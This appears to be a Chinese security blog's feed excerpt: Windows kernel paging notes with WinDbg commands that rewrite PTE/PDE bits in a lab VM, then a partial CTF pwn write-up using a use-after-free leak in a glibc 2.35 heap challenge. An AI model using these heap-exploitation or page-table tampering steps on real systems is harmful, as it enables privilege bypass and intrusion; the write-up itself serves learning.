class="line">    funcptr func=<span class="number">0</span>;</span><br><span class="line">    func();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时这个shellcdoe也是比较简单的，仅仅是弹框而已。</p><img src="/2024/11/10/WindowsKernel4/6.png" class=""><p>这里因为用的是 10-10-12 分页，所以说 PTE 没有哪个位表示页是否可以执行，也就是说所有的页都可以执行，在 2-9-9-12 分页我们只需要把最高位设置为 0 即可。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15364648.html">https://www.cnblogs.com/wingsummer/p/15364648.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_5/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_5&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">挂物理页的细节</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="分页" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E5%88%86%E9%A1%B5/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（3）——PAE分页（2-9-9-12分页）</title>
    <link href="https://xia0ji233.github.io/2024/11/09/WindowsKernel3/"/>
    <id>https://xia0ji233.github.io/2024/11/09/WindowsKernel3/</id>
    <published>2024-11-09T09:00:00.000Z</published>
    <updated>2025-01-17T10:46:28.492Z</updated>
    
    <content type="html"><![CDATA[<p>来学一下2-9-9-12分页，也叫PAE分页</p><span id="more"></span><h2 id="为什么要有2-9-9-12分页"><a href="#为什么要有2-9-9-12分页" class="headerlink" title="为什么要有2-9-9-12分页"></a>为什么要有2-9-9-12分页</h2><p>这一定一定是最会疑惑的一个问题，为什么要多拆一个 2 出来呢？回答：扩展物理内存。</p><p>我们都知道，32位的系统最大只能装 4GB 的内存，多了它用不上，然而这个说法比较片面，实则它可以装更多的内存，在 10-10-12 分页的模式中，我们知道，物理地址就是 32 位的，而物理地址位宽决定了物理内存最大的限度。</p><p>那么 2-9-9-12 分页事实上就做到了这一点，它将物理地址扩展到了 64 位的模式，并赋予一些位特殊的意义。既然物理地址变成了 64 位，PDE 和 PTE 自然也变成了 64 位，那么原来一个页就装不下 1024 个 PDE 或者 PTE 了，而只能装 512 个，这就是中间两个 9 的来源。而我们只扩展了物理地址，没有扩展虚拟地址，因此虚拟内存（单个进程持有的线性地址）最大还是只有 4GB。 所以前面再多个 2 去满足 32 位。</p><h2 id="2-9-9-12分页简介"><a href="#2-9-9-12分页简介" class="headerlink" title="2-9-9-12分页简介"></a>2-9-9-12分页简介</h2><p>看完上一节之后大概能对 2-9-9-12 分页有个结构了，如下图所示：</p><img src="/2024/11/09/WindowsKernel3/1.png" class=""><p>多了一层名为<strong>页目录指针表（PDPTE）</strong>的东西，同样也是 64 位的大小，它的结构如下图所示：</p><img src="/2024/11/09/WindowsKernel3/2.png" class=""><p>它只使用了高四个字节的四位，但是为了对齐它填充到了 8 个字节，因此物理页地址被扩展到了 36 位，物理可用的内存达到了 64GB。</p><p>如果一个进程挂满物理页的情况下，在 10-10-12 分页模式下只能运行一个，但是在 2-9-9-12 分页模式下可以运行 16 个。</p><p>剩下的 PDE 和 PTE 扩展结构同理。</p><p>再有一点需要说的是，我们的页属性只有读和写两种，但是在三环的内存中，似乎还有<strong>可执行</strong>这个位，那么这个位在哪呢，实际上它将这个位填到了高位，也就是说 PTE，PDE，PDPTE这些大致结构应该如下图所示：</p><img src="/2024/11/09/WindowsKernel3/3.png" class=""><p>这是硬件层面上做的保护，一旦尝试执行的物理页中对应的 PTE 和 PDE 和 PDPTE 被置为 1，说明该页的数据不可以被执行，CPU尝试执行的时候会直接报出异常。</p><h2 id="2-9-9-12分页实践"><a href="#2-9-9-12分页实践" class="headerlink" title="2-9-9-12分页实践"></a>2-9-9-12分页实践</h2><p>同样拿记事本和 CE 来做实验。</p><img src="/2024/11/09/WindowsKernel3/4.png" class=""><p>得到线性地址 <code>0x00264EE8</code>，拆分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000001001100100111011101000</span><br><span class="line">按2-9-9-12拆开</span><br><span class="line">00</span><br><span class="line">0x0</span><br><span class="line">000000001</span><br><span class="line">0x1</span><br><span class="line">001100100</span><br><span class="line">0x64</span><br><span class="line">111011101000</span><br><span class="line">0xEE8</span><br></pre></td></tr></table></figure><p>一样的流程找到对应的物理页</p><img src="/2024/11/09/WindowsKernel3/5.png" class=""><p>于此同时可以发现，在PTE条目中，最高位被置为 1，表示该数据是不执行的。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15364648.html">https://www.cnblogs.com/wingsummer/p/15364648.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_5/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_5&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;来学一下2-9-9-12分页，也叫PAE分页&lt;/p&gt;</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="分页" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E5%88%86%E9%A1%B5/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（2）——页属性实验</title>
    <link href="https://xia0ji233.github.io/2024/11/07/WindowsKernel2/"/>
    <id>https://xia0ji233.github.io/2024/11/07/WindowsKernel2/</id>
    <published>2024-11-07T14:00:00.000Z</published>
    <updated>2025-01-17T10:46:28.492Z</updated>
    
    <content type="html"><![CDATA[<p>来具体学习一下页属性</p><span id="more"></span><h2 id="看前必读"><a href="#看前必读" class="headerlink" title="看前必读"></a>看前必读</h2><p><strong>本文所述的第 x 位均表示下标从 0 开始的计数制。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0000100010001</span><br><span class="line">           *</span><br></pre></td></tr></table></figure><p>例如上面星号所指示的位置表示第 1 位。</p><h2 id="有效属性"><a href="#有效属性" class="headerlink" title="有效属性"></a>有效属性</h2><p>可以关注内核函数 <strong>MmIsAddressValid</strong> 实现原理，取出虚拟机 <code>C:\Windows\System32\ntoskrnl.exe</code> 内核文件，找到该函数，F5可得以下逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_48DCB8</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = *(_DWORD *)(((a1 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xFFC</span>) - <span class="number">0x3FD00000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (v1 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (v1 &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v3 = *(_DWORD *)(((a1 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x3FFFFC</span>) - <span class="number">0x40000000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (v3 &amp; <span class="number">0x80</span>) != <span class="number">0x80</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到第一个表达式 <code>(a1 &gt;&gt; 20) &amp; 0xFFC)</code>，可以认为是将地址右移了 22 位（取高10位），再左移了 2 位（<code>*4</code>），然后将该值减去 0x3FD00000，其实转换成加法就是 <code>+0xC0300000</code>，也就是我们的页目录表的线性地址。</p><p>如果该地址的最低位为 0，则返回 0（p位为0，无效）。</p><p>如果该地址的第7位为 1，说明是个大页，那么直接返回 1，整个页都是有效的，否则进行后续判断。</p><p>这里就是判断 PDE 的最低为是否为 0，若为 0 则还是无效。</p><p>否则返回第7位是否为 1 （这里存疑，不明白为什么PAT位为1才表示有效）。</p><p>总体，该函数的实现就是通过两个关键的线性地址 <code>0xC0000000</code> 和 <code>0xC0300000</code>，检查页表的属性来实现的功能。</p><h2 id="读写属性"><a href="#读写属性" class="headerlink" title="读写属性"></a>读写属性</h2><p>我是这么认为的：一个虚拟页，只要挂上了对应的物理页且有效，它必定可读，是否可写根据第 1 位标志位确定。</p><p>举个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *s=<span class="string">&quot;123456789&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,s);</span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov eax,ds:dword ptr[s]</span><br><span class="line">        <span class="type">int</span> <span class="number">3</span></span><br><span class="line">        mov ds:byte ptr[eax],<span class="number">0x66</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试向字符串常量指向的地址进行写入则必定会出一个写入错误，那么在中间下个断点，然后修改挂的物理页。</p><img src="/2024/11/07/WindowsKernel2/1.png" class=""><p>拆分得到 PDI，PTI分别为 1，3，页内偏移为 0x12C</p><img src="/2024/11/07/WindowsKernel2/2.png" class=""><p>可以发现 PTE 的第一位为 0，即该页不可写。</p><p>同时也可以验证一下该物理页的正确性</p><img src="/2024/11/07/WindowsKernel2/3.png" class=""><p>将该物理页设为可写，使用命令 <code>!ed a6fab00C 0b8e2027</code>。</p><p>可以发现这个字符修改成功了</p><img src="/2024/11/07/WindowsKernel2/4.png" class=""><h2 id="特权位"><a href="#特权位" class="headerlink" title="特权位"></a>特权位</h2><p>当我们处于三环的权限，我们无法访问 U&#x2F;S 位为 0 的页，通常，32位地址下，我们无法访问 80 开头的地址，因为只有 0 环态下可以访问。</p><p>例如，我修改 gdt 所属的页，让gdt变得三环状态可读，参考以下步骤：</p><ul><li>通过 gdtr 找到 gdt 所在的页。</li><li>拆分地址找到对应的物理页对应的 PTE。</li><li>将物理页的 U&#x2F;S 位改为 1。</li></ul><p>这里我的 gdtr 为 80b93800</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PDI 1000000010</span><br><span class="line">0x202</span><br><span class="line">PTI 1110010011</span><br><span class="line">0x393</span><br><span class="line">off 100000000000</span><br><span class="line">0x800</span><br></pre></td></tr></table></figure><p>按照同样的方法，找到了 gdt 的物理页。</p><img src="/2024/11/07/WindowsKernel2/5.png" class=""><p>图中反的主要原因时物理页输出是 dd，虚拟页输出是 dq，会小端序的反转一下。</p><p>我们看到物理页的 PTE，结果是 <code>00b93163</code>，很明显第二位，也就是 U&#x2F;S 位为 0，表明是 0 环才可以访问的，那么将它改为三环可访问，使用命令 <code>!ed 0018a000+0x393*4 00b93167</code>。</p><p>结果发现好像还是不可读，是为什么呢？</p><p>对啦，原来PDE对应的U&#x2F;S位也要改，因为它们是与的关系，所以还需要再增加一个命令 <code>!ed 0000000000185000+0x202*4 0018a067</code>，做完这些，再验证一下三环程序能否读到 gdt 表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD val=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">val=<span class="number">0</span>;</span><br><span class="line">__asm&#123;</span><br><span class="line">mov eax,ds:dword ptr[<span class="number">0x80b93808</span>]</span><br><span class="line">mov ds:dword ptr[val],eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,val);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要注意的是，PTE基本最后映射的都是同一个，但是PDE不一样，因此需要这么操作才能实验成功：</p><ul><li>运行程序，中断。</li><li>找到该程序 CR3 的值，得到 PDE，将PDE的U&#x2F;S位改为1（每次重新运行必须做这件事）</li><li>根据PDE找到对应的PTE，将PTE的U&#x2F;S位改为 1（只需要改一次就可以）</li></ul><img src="/2024/11/07/WindowsKernel2/6.png" class=""><p>可以看到，程序能够成功读取gdt表的四个字节。</p><h2 id="访问位"><a href="#访问位" class="headerlink" title="访问位"></a>访问位</h2><p>这个属性不太好做实验验证，只需要知道：访问（读或写）过了则为 1，否则为0。</p><h2 id="脏位"><a href="#脏位" class="headerlink" title="脏位"></a>脏位</h2><p>写过了则为 1，否则为0，且只有PTE具有这个属性。</p><h2 id="其余位"><a href="#其余位" class="headerlink" title="其余位"></a>其余位</h2><p>其余位都跟缓存相关，实验自己不太会设计了，咕咕吧，等后面有能力了再来验证。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15363603.html">https://www.cnblogs.com/wingsummer/p/15363603.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_4/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_4&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">来具体学习一下页属性</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="分页" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E5%88%86%E9%A1%B5/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>强网杯S8初赛Pwn writeup</title>
    <link href="https://xia0ji233.github.io/2024/11/07/qwb2024_pre/"/>
    <id>https://xia0ji233.github.io/2024/11/07/qwb2024_pre/</id>
    <published>2024-11-07T09:00:00.000Z</published>
    <updated>2025-01-16T12:47:32.154Z</updated>
    
    <content type="html"><![CDATA[<p>本次强网杯初赛做出两道pwn题，把详细题解写一下记录。</p><span id="more"></span><h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><p><a href="baby_heap_9a1b773b8406335f895bef78b2d8b8f3.zip">附件下载</a></p><img src="/2024/11/07/qwb2024_pre/1.png" class=""><p>2.35 的版本，IDA打开，堆菜单题，经典增删改查之外，还有两个额外的操作，一个是环境变量，另一个是任意地址写 0x10 字节。</p><p>del 里面有很明显的UAF漏洞。</p><img src="/2024/11/07/qwb2024_pre/2.png" class=""><p>show 只有一次机会，但是可以同时将 libc 和堆地址一起泄露出来，只需要我们释放两个相同大小的堆块之后，bk_nextsize 和 fd_nextsize 上面就会携带堆的地址，然而我自己的做法中没有用到。</p><p>交互函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;47.94.231.2&#x27;,)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">ch</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, payload</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;edit:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;show:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">env</span>(<span class="params">ch</span>):</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;sad !&#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr1,payload</span>):</span><br><span class="line">    choice(<span class="number">6</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;addr&#x27;</span>,p64(addr1))</span><br><span class="line">    p.send(payload)</span><br></pre></td></tr></table></figure><p>先add出四个堆块，把 1 3 free 掉，再打印出 3 堆块的内容，即可连带泄露 libc 和堆地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>运行结果</p><img src="/2024/11/07/qwb2024_pre/3.png" class=""><p>注意到选项 6 并不是任意地址写，而是有一定限制的，</p><img src="/2024/11/07/qwb2024_pre/4.png" class=""><p>这里说实话不知道是不是 IDA 解析有问题。因为理论上来说 stdin 是 <code>FILE *</code> 类型，占 8 字节，因此 <code>&amp;stdin[512]</code> 等同于 stdin 的地址加上 <code>512*8=4096=0x1000</code>，但是将视角调到汇编时会发现 </p><img src="/2024/11/07/qwb2024_pre/5.png" class=""><p>它往后加了 0x1b000 的地址，通常情况下，以汇编为准一定没问题（以上是做题时的想法），但是后来才发现犯了一个错误，stdin 的确是 FILE * 类型的，但是 <code>stdin[0]</code> 是 FILE 类型的，直接的 stdin 是一个指向 <code>_IO_2_1_stdin_</code> 的指针，类型为 FILE，在 gdb 里面也很容易观察到这一点。</p><img src="/2024/11/07/qwb2024_pre/6.png" class=""><p>这里主要观察这个 &amp;stdin[512] 与 stdin 的差值，以及可以发现，它所禁用的这个范围就是 libc <code>_IO_2_1_stdin_</code> 之后的data 段，全部不允许写。</p><p>而另外一个条件就有意思了，不能超过 80 开头的一个地址，基本不会触发，所以目标很明确，让我们去写 libc <code>_IO_2_1_stdin_</code> 之前的 data 段，或者是写堆段，程序段写不了因为没有办法泄露地址。</p><p>先考虑前者，来看看之前的 data 段存了哪些内容。</p><img src="/2024/11/07/qwb2024_pre/7.png" class=""><p>发现基本是 got 表，于是尝试输出看看 libc 的 got 表，发现都是跟字符串操作的相关函数</p><img src="/2024/11/07/qwb2024_pre/8.png" class=""><p>看来可以尝试在这里找一个函数作为跳板，能不能 <code>one_gadget</code> 呢？显然不能，这题有沙箱。</p><img src="/2024/11/07/qwb2024_pre/9.png" class=""><p>除非你能找到一个 execveat 系统调用执行的 <code>one_gadget</code> 这题才能直接一键利用。</p><p>同时注意到选项 5 对环境变量的相关操作</p><ul><li>getenv</li><li>putenv</li><li>setenv</li></ul><p>这里可以直接上 glibc 的源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *</span><br><span class="line"><span class="title function_">getenv</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> **ep;</span><br><span class="line">  <span class="type">uint16_t</span> name_start;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__environ == <span class="literal">NULL</span> || name[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (name[<span class="number">1</span>] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* The name of the variable consists of only one character.  Therefore</span></span><br><span class="line"><span class="comment"> the first two characters of the environment entry are this character</span></span><br><span class="line"><span class="comment"> and a &#x27;=&#x27; character.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __BYTE_ORDER == __LITTLE_ENDIAN || !_STRING_ARCH_unaligned</span></span><br><span class="line">      name_start = (<span class="string">&#x27;=&#x27;</span> &lt;&lt; <span class="number">8</span>) | *(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) name;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      name_start = <span class="string">&#x27;=&#x27;</span> | ((*(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) name) &lt;&lt; <span class="number">8</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">for</span> (ep = __environ; *ep != <span class="literal">NULL</span>; ++ep)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _STRING_ARCH_unaligned</span></span><br><span class="line">  <span class="type">uint16_t</span> ep_start = *(<span class="type">uint16_t</span> *) *ep;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">uint16_t</span> ep_start = (((<span class="type">unsigned</span> <span class="type">char</span> *) *ep)[<span class="number">0</span>]</span><br><span class="line">       | (((<span class="type">unsigned</span> <span class="type">char</span> *) *ep)[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (name_start == ep_start)</span><br><span class="line">    <span class="keyword">return</span> &amp;(*ep)[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> len = <span class="built_in">strlen</span> (name);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _STRING_ARCH_unaligned</span></span><br><span class="line">      name_start = *(<span class="type">const</span> <span class="type">uint16_t</span> *) name;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span 